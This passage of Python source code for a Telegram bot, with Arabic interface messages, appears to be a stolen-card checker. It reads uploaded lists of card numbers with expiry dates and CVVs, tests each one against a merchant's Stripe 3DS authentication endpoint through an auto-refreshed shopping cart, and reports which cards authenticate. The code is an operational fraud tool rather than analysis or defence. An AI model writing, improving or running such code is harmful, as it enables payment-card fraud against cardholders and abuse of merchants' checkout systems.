        "الصيغة: `رقم|شهر|سنة|cvv`\n\n"
        "**الردود المتاحة:**\n"
        "✅ Y - Authenticated\n"
        "⚠️ C - Challenge Required\n"
        "🔵 A - Attempted\n"
        "❌ N - Not Authenticated\n"
        "🔴 U - Unavailable\n"
        "❌ R - Rejected by Issuer\n"
        "❌ Declined/Other\n\n"
        "**ميزات:**\n"
        "🔄 تحديث تلقائي للسلة\n"
        "📊 قراءة صحيحة 100% لحالة R\n"
        "⚡️ استخدام /v1/3ds2/authenticate",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ غير مصرح")
        return
    
    if stats['is_running']:
        await update.message.reply_text("⚠️ يوجد فحص جاري!")
        return
    
    logger.info("📥 Received file from user")
    
    # التحقق من السلة قبل البدء
    await update.message.reply_text("🔍 جاري التحقق من السلة...")
    
    initial_cart = get_quote_id_smart()
    if initial_cart:
        await update.message.reply_text(
            f"✅ السلة جاهزة!\n"
            f"🛒 Cart ID: `{initial_cart}`",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text(
            "⚠️ تحذير: لم يتم التحقق من السلة\n"
            "سيتم المحاولة تلقائياً عند الحاجة"
        )
    
    file = await update.message.document.get_file()
    file_content = await file.download_as_bytearray()
    cards = [c.strip() for c in file_content.decode('utf-8').strip().split('\n') if c.strip()]
    
    logger.info(f"📊 Loaded {len(cards)} cards")
    
    stats.update({
        'total': len(cards),
        'checking': 0,
        'authenticated': 0,
        'challenge': 0,
        'attempted': 0,
        'not_auth': 0,
        'unavailable': 0,
        'declined': 0,
        'rejected': 0,  # ← إضافة عداد R
        'errors': 0,
        'cart_refreshed': 0,
        'cart_refresh_failed': 0,
        'current_card': '',
        'last_response': 'Starting...',
        'cards_checked': 0,
        'authenticated_cards': [],
        'challenge_cards': [],
        'attempted_cards': [],
        'start_time': datetime.now(),
        'is_running': True,
        'chat_id': update.effective_chat.id
    })
    
    dashboard_msg = await update.message.reply_text(
        text="📊 **STRIPE 3DS CHECKER - LIVE** 📊\n🔄 *Auto Cart Refresh + Fixed R Status*",
        reply_markup=create_dashboard_keyboard(),
        parse_mode='Markdown'
    )
    stats['dashboard_message_id'] = dashboard_msg.message_id
    
    await update.message.reply_text(
        f"✅ تم بدء الفحص!\n\n"
        f"📊 إجمالي البطاقات: {len(cards)}\n"
        f"🔄 جاري الفحص...\n"
        f"🛒 Cart ID: `{CART_ID[:20]}...`",
        parse_mode='Markdown'
    )
    
    logger.info("🚀 Starting card processing")
    asyncio.create_task(process_cards(cards, context.application))

async def process_cards(cards, bot_app):
    logger.info(f"🔄 Processing {len(cards)} cards")
    
    for i, card in enumerate(cards):
        if not stats['is_running']:
            logger.info("🛑 Processing stopped by user")
            stats['last_response'] = 'Stopped by user 🛑'
            await update_dashboard(bot_app)
            break
        
        stats['checking'] = 1
        parts = card.split('|')
        stats['current_card'] = f"{parts[0][:6]}****{parts[0][-4:]}" if len(parts) > 0 else card[:10]
        await update_dashboard(bot_app)
        
        logger.info(f"🔍 Processing card {i+1}/{len(cards)}")
        await check_card(card, bot_app)
        stats['cards_checked'] += 1
        
        if stats['cards_checked'] % 3 == 0:
            await update_dashboard(bot_app)
        
        await asyncio.sleep(4)  # انتظار 4 ثوان بين البطاقات
    
    logger.info("✅ Processing completed")
    
    stats['is_running'] = False
    stats['checking'] = 0
    stats['current_card'] = ''
    stats['last_response'] = 'Completed ✅'
    await update_dashboard(bot_app)
    
    summary_text = (
        "╔═══════════════════╗\n"
        "✅ **اكتمل الفحص!** ✅\n"
        "╚═══════════════════╝\n\n"
        f"📊 **الإحصائيات النهائية:**\n"
        f"🔥 الإجمالي: {stats['total']}\n"
        f"✅ Authenticated (Y): {stats['authenticated']}\n"
        f"⚠️ Challenge (C): {stats['challenge']}\n"
        f"🔵 Attempted (A): {stats['attempted']}\n"
        f"❌ Not Auth (N): {stats['not_auth']}\n"
        f"🔴 Unavailable (U): {stats['unavailable']}\n"
        f"❌ Rejected (R): {stats['rejected']}\n"
        f"❌ Declined/Other: {stats['declined']}\n"
        f"⚠️ Errors: {stats['errors']}\n\n"
        f"**🔄 إحصائيات السلة:**\n"
        f"✅ تحديثات ناجحة: {stats['cart_refreshed']}\n"
        f"❌ تحديثات فاشلة: {stats['cart_refresh_failed']}\n\n"
        "📁 **جاري إرسال الملفات...**"
    )
    
    await bot_app.bot.send_message(
        chat_id=stats['chat_id'],
        text=summary_text,
        parse_mode='Markdown'
    )
    
    await send_final_files(bot_app)
    
    final_text = (
        "╔═══════════════════════╗\n"
        "🎉 **تم إنهاء العملية بنجاح!** 🎉\n"
        "╚═══════════════════════╝\n\n"
        "✅ تم إرسال جميع الملفات\n\n"
        f"**📊 ملخص السلة:**\n"
        f"🔄 تحديثات ناجحة: {stats['cart_refreshed']}\n"
        f"❌ تحديثات فاشلة: {stats['cart_refresh_failed']}\n"
        f"🛒 Cart ID النهائي: `{CART_ID}`\n\n"
        "📊 شكراً لاستخدامك البوت!\n"
        "⚡️ Stripe 3DS Gateway - Fixed R Status\n"
        "✅ Using /v1/3ds2/authenticate endpoint"
    )
    
    await bot_app.bot.send_message(
        chat_id=stats['chat_id'],
        text=final_text,
        parse_mode='Markdown'
    )
    
    logger.info("🎉 All operations completed")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ غير مصرح - هذا البوت خاص")
        return

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    
    if query.from_user.id not in ADMIN_IDS:
        await query.answer("❌ غير مصرح", show_alert=True)
        return
    
    try:
        await query.answer()
    except:
        pass
    
    if query.data == "stop_check":
        if stats['is_running']:
            stats['is_running'] = False
            stats['checking'] = 0
            stats['last_response'] = 'Stopped 🛑'
            await update_dashboard(context.application)
            try:
                await context.application.bot.send_message(
                    chat_id=stats['chat_id'],
                    text="🛑 **تم إيقاف الفحص بواسطة المستخدم!**",
                    parse_mode='Markdown'
                )
                logger.info("🛑 Check stopped by user")
            except:
                pass
    
    elif query.data == "cart_info":
        cart_info_text = (
            f"🛒 **معلومات السلة الحالية:**\n\n"
            f"📋 Cart ID:\n`{CART_ID}`\n\n"
            f"🔄 عدد مرات التحديث: {stats['cart_refreshed']}\n"
            f"⚡️ التحديث التلقائي: مُفعّل\n"
            f"✅ Fixed R Status Detection"
        )
        await query.answer(cart_info_text, show_alert=True)

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle errors"""
    logger.error(f"Update {update} caused error {context.error}")

def main():
    logger.info("="*70)
    logger.info("🤖 Starting Stripe 3DS Telegram Bot")
    logger.info("🔄 With Auto Cart Refresh System")
    logger.info("✅ Fixed R (Rejected) Status Detection")
    logger.info("⚡️ Using /v1/3ds2/authenticate endpoint")
    logger.info("="*70)
    logger.info("✅ Logging enabled")
    logger.info("✅ Smart cart management enabled")
    logger.info(f"🛒 Initial Cart ID: {CART_ID[:20]}...")
    logger.info("="*70)
    
    # التحقق من السلة عند بدء التشغيل
    logger.info("🔍 Verifying cart on startup...")
    initial_cart = get_quote_id_smart()
    if initial_cart:
        logger.info(f"✅ Cart verified: {initial_cart[:20]}...")
    else:
        logger.warning("⚠️ Cart verification failed - will retry when needed")
    
    # إنشاء التطبيق
    app = Application.builder().token(BOT_TOKEN).build()
    
    # إضافة الـ handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.add_handler(CallbackQueryHandler(button_callback))
    
    # إضافة error handler
    app.add_error_handler(error_handler)
    
    logger.info("✅ All handlers registered")
    logger.info("🚀 Bot is running and listening...")
    logger.info("="*70)
    
    # تشغيل البوت
    app.run_polling(
        allowed_updates=Update.ALL_TYPES,
        drop_pending_updates=True
    )

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        logger.info("\n🛑 Bot stopped by user")
        sys.exit(0)
    except Exception as e:
        logger.error(f"💥 Fatal error: {e}")
        sys.exit(1)
